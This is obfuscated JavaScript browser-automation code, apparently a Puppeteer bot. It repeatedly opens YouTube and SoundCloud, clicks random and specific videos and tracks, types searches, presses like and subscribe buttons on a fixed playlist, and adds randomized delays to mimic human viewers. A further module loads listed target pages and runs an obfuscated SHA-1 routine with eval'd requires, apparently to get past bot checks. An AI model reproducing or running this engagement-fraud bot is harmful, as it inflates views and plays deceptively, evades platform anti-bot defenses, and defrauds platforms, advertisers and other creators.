const W = b,
  V = c,
  U = d;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x5 * -0x2e7 + -0xb + -0xe77))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x11 * 0x227 + -0x1 * -0x262d + -0x7 * 0x3a), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0x66ff + 0x4fa9 + -0x4178 + (-0x5143 + -0x1 * 0x6ad + 0x9288) * random()) : await standardWaitForNetIdle(f), await wait(-0x21e6 + 0x1c0d + -0x49 * -0x59 + (-0x2 * 0x389 + 0xbd4 + 0x1 * 0x224e) * random()), -0x2 * -0x1b4 + -0x20c2 + 0x1d5b;
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x1dcb + -0x1 * 0x1841 + 0x4994), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0xedd + 0x3 * -0xb25 + -0x5 * -0x9a9;
}
async function randomWait() {
  return await wait(0x1 * 0x1f49 + -0x216c + 0x15ab + (-0x656 * -0x1 + 0x1 * 0x1ad8 + -0xda6) * random()), 0x688 + 0x1d * 0xba + -0x1 * 0x1b99;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0x2408 + -0x7db + -0x2be3 * -0x1, 0x19ef * -0x1 + 0x1a9e + -0xa8), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0x6394 * 0x1 + 0x13 * 0x108c + -0xb398) * getRandomInt(-0xd * -0x2c6 + 0x65 * -0x33 + -0xfed, -0x241 * -0x11 + 0x2b7 + -0x1 * 0x2903), h)), 0xe2 + -0x124b + 0x6 * 0x2e7;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x3 * -0xa4 + 0x5ad * 0x5 + -0x1a75;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0x270f * -0x1 + -0x1323 + -0x13eb]['split']('\x20');
    for (let k = 0x651 + 0x1 * 0x1294 + -0x1 * 0x18e5; k < i['length']; k += 0x24 * 0xe7 + 0x694 + -0x1 * 0x270e)
      j += i[k] * h[i[k + (0x7 * 0x200 + -0x245c + 0x165d)]];
    return j;
  });
}

function a() {
  const bl = [
    'CMCVzw4VC2nYAq',
    'W61uAZRcSKvUWRmplW',
    'D8oZWPTZESkqvNbbaG',
    'Ahr0Chm6lY93DW',
    'WR8vW6pdRSoNWQ7dOmkcWOJdQG',
    'ENbdq1bAzLa4ta',
    'takes-time',
    'e/baidu.co',
    'yxjYyxK',
    'long-day-r',
    'WQi9t8kXWQldN8kgrSoqra',
    'hXpcK8k5b8kjB3W',
    'AhjVBwuVmta4lG',
    'easyfork.o',
    '4804',
    'AgvHzgvYCW',
    'WPZcHConwCowtCkOvx/cKW',
    'W4ldVSkuW6TfpmkrW4GtmW',
    'https://ww',
    'https://gr',
    'WO7cNmohySoZFCkGcdpcTq',
    'BtncqwHLmxDZBa',
    'Bw9VlMLVigHPzW',
    'CMvZDhjPy3rPBW',
    'pageerror',
    'ChrZlZqXmZK2nq',
    '-dune-mod-',
    'xSoBWRNcMCoFW43dVmoUWRD+'
  ];
  a = function() {
    return bl;
  };
  return a();
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x736 + -0x1 * 0x1d4b + 0x2487)['map'](l => Array['from'](l['children']))['flat'](0xbdd + -0x145f + -0x883 * -0x1)['map'](l => l['childNodes'][0x11 * -0x139 + 0xd55 * -0x1 + -0x6d3 * -0x5]['childNodes'][-0x58 * 0x11 + -0x9a1 + 0xf79]['childNodes'][-0x5c5 * -0x3 + 0x5 * 0x2e + -0x1234]['childNodes'][-0xcbe + -0xd8c + -0x1 * -0x1a4a]['childNodes'][0x24b8 + -0x1e63 + -0x654]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x8c + -0x20e9 + -0xc17 * -0x3, -0x57c + -0xd28 * -0x1 + 0xbdc)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x21 * 0x249 + 0x46d6 + 0x3f2b);
  const h = await getMaxTime(f),
    i = Math['min']((0x824d + 0x23de + 0x397 * 0x13) * getRandomInt(-0x164a + -0x517 + 0x1b63 * 0x1, -0x28 * -0x90 + 0x49 * 0x2f + -0x23e2), h);
  return await wait(i), -0x2708 + -0x11ad + 0x38b6;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0x1 * -0x20db + -0x105a + -0x1081]['children'][0x1aee + -0x1be4 + 0x3 * 0x52]['children'][0xd * 0xc7 + -0x221 + -0x7fa]['children'][-0x249e + 0x7 * -0x9b + 0x28db]['children'][-0x1faa + -0x1 * 0x812 + -0x27bc * -0x1]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x260d + 0x7a2 + 0x1e6c;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x2 * -0x220 + 0x2c3 * -0x1 + 0x5 * 0x17b + (-0x22f6 + -0x83 * 0x2 + 0x242e * 0x1) * random()
  }), await wait(0x1d20 + -0x855 * -0x1 + -0x2381 + (0xb1 * 0x13 + -0x1 * 0x1e72 + 0x127b) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0xc8 + -0x45c + 0x526]['childNodes'][0x3 * 0xab6 + -0x5d9 * -0x3 + -0x31ac]['childNodes'][-0x1 * -0x15aa + -0x1 * 0x26d8 + 0x112f]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0x9d0 + 0xdf8 + -0x1 * 0x423]['childNodes'][-0x1 * 0x1f67 + 0x35a + -0x1 * -0x1c0d]['childNodes'][-0x3 * 0x470 + -0x22be + -0x10 * -0x301]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0xc * -0x25d + 0x9c6 + 0x1 * 0x1297),
          r = 0x40d + -0x1a6 * -0x10 + -0x1e6d * 0x1;
        for (let u = 0xe51 * 0x2 + 0x20f2 + -0x3d94; u < q['length']; u += 0x2078 + 0x5 * -0x5c + -0x622 * 0x5)
          r += q[u] * k[q[u + (-0x2309 + -0x1 * -0xf1 + 0x2219)]];
        return r;
      }(n);
  });
  await wait((0x1f * 0x231 + -0x1 * -0x11ab + -0x1b02) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x7 * -0x241a + -0x1955 + 0x6ff * 0x1) * getRandomInt(0x7 * -0x6 + -0x835 + 0x86 * 0x10, 0xf5d + -0x1811 * -0x1 + -0x2764), h + (-0x1910 + 0x30b * -0x2 + 0x32ae));
  return await wait(i), 0x57 * 0x64 + 0x2203 * 0x1 + -0x43fe;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0xd07 + -0x13bd + -0x9 * -0x3a4), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0xb9a * 0x1 + -0x26d8 + 0x3e2a + (0x122 * 0x1b + -0xdc4 + -0xcea) * Math['random']());
    });
  }, -0x35e1 + 0x516 * -0x9 + 0x2a55 * 0x3);
  await wait(0x4d * -0xb29 + -0x1bfdc + -0x789 * -0x149);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0x1d250 + 0x7cf9 * -0x3 + 0x47b5 * 0xf) * getRandomInt(-0x552 + 0xd3b + -0x1 * 0x7e5, -0x1e7 + 0x135d + 0x1 * -0x115d)), clearInterval(h), 0x2d * -0x9b + 0x11c8 + 0x978;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x2083 + -0xfcd + -0x10b6 * 0x1;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x4 * 0x3b4 + 0x1287 + -0x32 * 0x13;
    await randomWait();
  }
  return 0x1e54 + -0x45 * -0x3a + 0x1 * -0x2df5;
}

function fetchRandomSC() {
  const S = b,
    R = d;
  return Math['random']() <= -0x951 + -0x1a3 * -0x17 + -0x1c54 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + R(0x9) + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x2531 * 0x1 + -0x1dd9 + 0x2 * 0x2185 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + S(0x2, '2%V&') + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x1 * -0x137d + 0x1c40 + -0x8c3 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0x1d * 0xdc + 0x16eb + -0x2fd7;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0x826f + 0x1 * -0x626b + 0x194a2 + getRandomInt(-0x679 * -0x1 + -0x47 * 0xf3 + 0x7784, -0xafe1 + -0x5 * -0x649 + 0x105a4));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0x1e4c + 0xa22 * -0x1 + -0x1429), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x2 * -0xb2 + -0x1f7f + -0x1 * -0x20e3;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0x169 * -0x15 + -0x1528 + -0x875 * 0x1, -0x97e + -0x3 * -0x7c7 + -0x1 * 0xda5)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x18e1 + -0xedc + -0x6cb * -0x7 + floor((0x2 * 0x10d3 + 0x5b6 * -0x3 + -0xc9c) * random()))), log('p2'), log(await s['evaluate'](() => {
        const T = c;
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(0x622905d8 + 0x75b18e0 * -0x3 + -0x4b2e6 * -0xb0c),
          -0xaa3670 + 0x1 * -0xa82d19 + -0x9b7683 * -0x3,
          -0x9 * 0x980 + 0xfda2 + -0x2822,
          0x158 * -0xb + 0xb5f + 0x3e9
        ], y = [
          -0x10 * -0xe2 + -0x1 * -0x1271 + -0x2079,
          0x5 * -0x3d9 + 0x853 * -0x2 + 0x23f3,
          -0x1dcd + 0x15 * -0x16a + 0x3b87 * 0x1,
          -0x5 * 0x104 + 0x1 * -0x23c6 + 0x28da
        ], z = [
          'hex',
          T(0x8),
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x1 * 0x1b89 + -0x13 * 0x4a + -0x160a)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0x17b6 + 0x1393 * -0x1 + 0x2b49; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0xdc9 + 0x1 * 0x7f9 + 0x5d0) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x21dd + -0x22 * 0x119 + 0x375] = A[0x4e * -0x3 + -0x12e9 * -0x1 + 0x11ef * -0x1] = A[0x31c * 0x6 + 0xda * 0x2 + -0x145b] = A[-0x1941 + 0xf06 + 0x1 * 0xa3d] = A[-0x1230 + -0x926 * -0x1 + 0x14b * 0x7] = A[-0x1268 + 0x1f5b + -0xcef] = A[0x565 * -0x1 + 0x1 * -0xa22 + 0xf8c] = A[-0x1fd4 + -0x1 * -0x233 + 0x1da7 * 0x1] = A[-0x4 * 0x57a + -0x17f4 + 0x2de3] = A[-0x4 * 0x58c + -0x5d5 + -0x1 * -0x1c0d] = A[-0x1 * 0x2045 + -0x86b + 0x1 * 0x28b9] = A[-0x215e + 0x50c * -0x3 + -0x4 * -0xc23] = A[-0x139d * 0x1 + -0x28c * -0xa + -0xf8 * 0x6] = A[0x1fc4 + -0x24a0 + -0x4 * -0x13a] = A[-0x114e * 0x1 + -0x1213 + 0x236e] = A[0x1fc * 0x7 + -0x13e8 * -0x1 + -0x2 * 0x10df] = A[-0x7 * 0x2ad + 0x182a + -0x560] = -0x238 * 0xe + 0x55c + 0x1 * 0x19b4, this['blocks'] = A) : this['blocks'] = [
                -0x432 * 0x5 + 0x1 * 0x2232 + -0xd38,
                0x1de0 + -0x1b51 + -0x28f,
                0x16c3 * -0x1 + 0x96e * -0x1 + 0x2031,
                -0xce5 + -0x1ea + 0xdf * 0x11,
                0x1b9b + 0x1 * 0x19f9 + -0x3594,
                -0x7 * 0x32 + 0x16a * -0xb + 0x876 * 0x2,
                0xb19 + 0x702 + 0x203 * -0x9,
                0x65e * -0x1 + -0x5 * 0x110 + -0x17 * -0x82,
                -0x2206 + -0x14a7 + -0x1 * -0x36ad,
                0xfd6 + 0x8c2 * -0x3 + -0x29c * -0x4,
                0x3 * -0x265 + 0x6f7 * 0x1 + 0x38,
                0x18c4 + -0x1d7f + -0xad * -0x7,
                0xf3 + 0x1 * 0xe4b + 0x2 * -0x79f,
                0x23dd * -0x1 + 0x16d4 + 0xd09,
                0x1dbf + 0x1 * 0x21b3 + 0x1 * -0x3f72,
                0x1042 * -0x2 + -0x1026 + -0x1855 * -0x2,
                0x1df * 0x2 + 0x266c + 0x606 * -0x7
              ], this['h0'] = -0x1 * 0xc7618ccb + -0xb880c4dc + 0x1e72774a8, this['h1'] = 0x887a2e32 + 0x174bf56e0 + -0x10d6bd989, this['h2'] = 0x1d6584e3 + -0x1ebe87a3 * -0x1 + 0x5c96d078, this['h3'] = -0x1bdab7cf + 0x1b1461 + -0x219ea * -0x14ea, this['h4'] = -0x18d * 0xdf6715 + 0x22c3d * 0x365d + -0x190f * -0x10ed28, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x1316 + 0x5ba * -0x3 + -0x2 * -0x1222, this['finalized'] = this['hashed'] = 0x48f + -0xe3 * -0x1 + -0x2 * 0x2b9, this['first'] = 0x1bd5 + 0x221f + -0x3df3;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0xd2e + 0x1 * 0x146f + -0x26b * 0x3, O = J['length'] || -0x22fa + -0x1 * 0x17b + 0x3d * 0x99, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0x7 * -0x1f9 + -0x8 * 0x45a + 0x1501, P[-0x179f + 0x13e1 + 0x3be] = this['block'], P[0x166 * -0x1b + 0x8 * 0xd3 + 0x1f3a] = P[0xc79 + 0x1ef4 + -0xadb * 0x4] = P[0x188b + 0x34e + 0x1 * -0x1bd7] = P[0x38e + 0x14f * -0x1 + -0x23c] = P[0xb * 0x1d3 + -0x242c + 0x101f] = P[-0x9e6 + 0x1 * 0x345 + 0x6a6] = P[-0x1ba + 0x199 + 0x27 * 0x1] = P[0x480 + 0x177 * 0xf + -0xa * 0x2a5] = P[-0x171e * 0x1 + -0x2179 + 0x389f] = P[-0xc8d + 0x6cb + 0x5cb] = P[0x1654 * -0x1 + 0x1a49 + 0x3eb * -0x1] = P[0x7d * 0x11 + -0x18a3 + -0x257 * -0x7] = P[-0x1994 + -0x2311 + 0x3cb1] = P[-0xe41 + -0x6 * -0x23d + 0xe0] = P[-0x1 * 0xb9 + 0x1 * -0x24fb + -0x12 * -0x219] = P[0x3 * -0xa03 + -0x25a5 * 0x1 + 0x43bd] = -0x3 * 0x947 + -0x1021 + 0x296 * 0x11), K) {
                    for (N = this['start']; M < O && N < -0x2b7 + -0x21b6 + 0x24ad; ++M)
                      P[N >> -0x6a6 + 0x3 * -0x52c + -0x102 * -0x16] |= J[M] << y[-0xfb * -0x17 + -0x538 + -0x5c6 * 0x3 & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x1 * -0x15d7 + 0x1321 + -0x28b8; ++M)
                      (L = J['charCodeAt'](M)) < -0xa93 * -0x2 + -0x168f + 0x1e9 ? P[N >> -0x2 * -0x1078 + -0x26bc + -0x1 * -0x5ce] |= L << y[-0x1d64 + -0x1199 + 0x80 * 0x5e & N++] : L < -0x332 * 0x4 + 0xe8 * -0x16 + 0x28b8 ? (P[N >> -0x1fdf + -0xd7 * -0x22 + 0x353] |= (0x1 * -0x64b + 0x238 * 0x7 + -0x87d | L >> -0x266 + 0x125f + -0x551 * 0x3) << y[0x2 * 0x584 + -0x1ec1 + 0x3 * 0x694 & N++], P[N >> -0x53f * -0x4 + 0x1c30 + -0x196 * 0x1f] |= (-0x1f * 0x6b + 0x7 * -0x529 + -0x3194 * -0x1 | -0x2215 + 0x11 * -0x122 + -0x26 * -0x169 & L) << y[-0x1290 + -0x1200 + 0x2493 & N++]) : L < 0x1 * -0x9676 + -0x155fc + 0x2c472 || L >= 0xf54e + 0x2e28 + -0x4376 ? (P[N >> 0x219 + -0x936 + -0x71f * -0x1] |= (-0x4e1 * 0x4 + 0x95 * -0x13 + 0x1f73 * 0x1 | L >> 0x11 * 0x1c6 + -0x155 * -0x16 + -0x3b68) << y[-0x1c08 + 0xd * 0x28d + -0x51e & N++], P[N >> 0x2a1 * 0x4 + -0x153e + -0x4 * -0x2af] |= (-0x26 * -0x47 + 0x71b + -0x1125 | L >> 0xde * -0x29 + 0x2 * 0xedb + 0x1 * 0x5de & 0x1 * 0x1ae3 + -0x12c2 + -0x7e2) << y[0x3 * 0x5 + -0x969 + 0x33 * 0x2f & N++], P[N >> -0x3 * -0xa9f + 0x2703 + -0x2 * 0x236f] |= (0x12e0 + 0x1cd0 + -0x2f30 | -0x2b * 0xad + -0x2272 + 0x3fc0 & L) << y[0x12d8 * -0x2 + 0x12c1 + -0x19 * -0xc2 & N++]) : (L = 0x147a3 + 0xa348 + -0x1 * 0xeaeb + ((-0x73c + 0x1f6 * -0x10 + 0x2a9b & L) << 0x1 * 0x1af3 + 0x67 * -0x2d + -0x2 * 0x467 | -0x9 * -0x1d0 + -0x1c07 + -0xfb6 * -0x1 & J['charCodeAt'](++M)), P[N >> -0x46 * 0x5c + -0x30c * -0xc + 0x1 * -0xb66] |= (-0x13 * 0xad + 0x51d + -0x8aa * -0x1 | L >> -0x1515 + 0x1 * -0x4b8 + -0x19df * -0x1) << y[-0x1ddb + 0x1291 * 0x2 + -0x744 & N++], P[N >> 0xc83 + -0x24f9 + 0xc * 0x20a] |= (0x14b * 0x2 + 0x2 * 0x23b + -0x68c | L >> -0x1d13 * -0x1 + 0x100b * 0x1 + -0x2d12 & 0x1523 + -0x492 + -0x1052) << y[0xd91 + 0x2f * -0x86 + 0xb0c & N++], P[N >> -0x38 * 0x2a + -0x2b * 0x1d + 0xe11 * 0x1] |= (-0x2 * -0xbbf + 0x5a7 + -0x1ca5 * 0x1 | L >> -0x6ef * 0x2 + -0x1b2 * 0xe + 0x25a0 & 0x797 + 0x156e * 0x1 + 0x3a * -0x7f) << y[-0x1 * 0x4cf + 0x7d7 + -0x305 * 0x1 & N++], P[N >> 0x13de + 0x1df4 + -0x31d0 * 0x1] |= (0x11 * -0x14b + 0xa72 + -0x1 * -0xc09 | 0x5d * 0x2b + -0x1a0c + 0xaac & L) << y[0xd42 + -0x1a * 0x94 + 0x1c9 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x1d9c + -0x3 * 0xf9 + -0x1a71 ? (this['block'] = P[-0x2024 + -0x1 * -0x1efd + 0x137 * 0x1], this['start'] = N - (0xcd7 + 0x564 + -0x11fb), this['hash'](), this['hashed'] = 0x24a * 0x7 + -0x1 * -0x1a6b + 0x70 * -0x61) : this['start'] = N;
                }
                return this['bytes'] > 0x9d1e0f5c + 0x2757eec3 * 0xd + 0x13a * -0x1505f8a && (this['hBytes'] += this['bytes'] / (-0x57ee2154 + 0x14336c800 * 0x1 + 0x14b75954) << 0x8a * -0x7 + -0x1e5f + 0x2225 * 0x1, this['bytes'] = this['bytes'] % (0x1b07e644c + 0x1125717e * 0x14 + -0x2076b4224)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0xb65 * 0x1 + -0x1f86 + 0x1 * 0x1422;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[-0x2 * -0x2f6 + -0x1 * 0x1db9 + 0x17dd] = this['block'], J[K >> 0x4c0 * -0x7 + -0x6c1 + 0x2803] |= x[-0x2039 + 0x22bc + 0x1 * -0x280 & K], this['block'] = J[-0x8ce * 0x2 + -0xd5 * -0x26 + -0xdf2], K >= -0xed1 + 0x2 * -0x855 + 0x657 * 0x5 && (this['hashed'] || this['hash'](), J[0x24ad + 0x3 * -0x303 + -0x2 * 0xdd2] = this['block'], J[-0x10b7 + -0x296 * 0x6 + 0x204b] = J[-0x93 * -0x32 + -0x1 * 0xbf5 + 0x43 * -0x40] = J[0x34f + -0x13ea + -0x1 * -0x109d] = J[-0x1c2b + 0x919 + -0x5 * -0x3d1] = J[-0x4 * -0x372 + 0x2064 + -0x2e28] = J[-0xabc + -0x2074 + 0x2b35] = J[0x26c8 + -0x2a + -0x3dc * 0xa] = J[-0x19ba + 0xa6 + 0x1 * 0x191b] = J[0x3b5 * 0x7 + -0x1 * -0x258f + 0x3f7a * -0x1] = J[-0xf61 + 0x2160 + -0x79 * 0x26] = J[0x237 + 0x1 * 0xf + -0x23c] = J[0x2 * -0x463 + 0x176c + -0xe9b] = J[0xec7 + -0x6 * 0x368 + -0x5b5 * -0x1] = J[-0x14 * -0x1a5 + 0x5 * -0xa9 + 0x1d8a * -0x1] = J[-0xff0 + 0x19a9 + 0x5 * -0x1ef] = J[0xffb * 0x2 + -0x83f + -0x17a8] = 0x11d3 + -0x1ea8 + -0x1 * -0xcd5), J[-0x1bf4 + -0x193f + 0x3541 * 0x1] = this['hBytes'] << -0x218 + -0x1 * -0x73f + 0x2 * -0x292 | this['bytes'] >>> -0xc9 + -0x1747 + -0x1 * -0x182d, J[0x1456 + 0x1 * -0x57 + -0x13f0] = this['bytes'] << -0x1b2f + 0x197b + 0x1b7, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x971 + 0x13a6 + -0x1d07; J < 0x1 * 0x7f2 + 0xb * -0x112 + 0x424; ++J)
                K = Q[J - (0x87f + 0x1999 + -0x5 * 0x6d1)] ^ Q[J - (-0x229d * -0x1 + -0x1 * 0x1c39 + -0x65c)] ^ Q[J - (-0xf4 * -0x22 + -0x1916 + 0xba * -0xa)] ^ Q[J - (0x9cd + -0x2 * -0xe70 + -0x269d)], Q[J] = K << -0x7a0 * -0x2 + 0x1156 + -0x1b7 * 0x13 | K >>> -0x8fe + -0x679 + 0x5f * 0x2a;
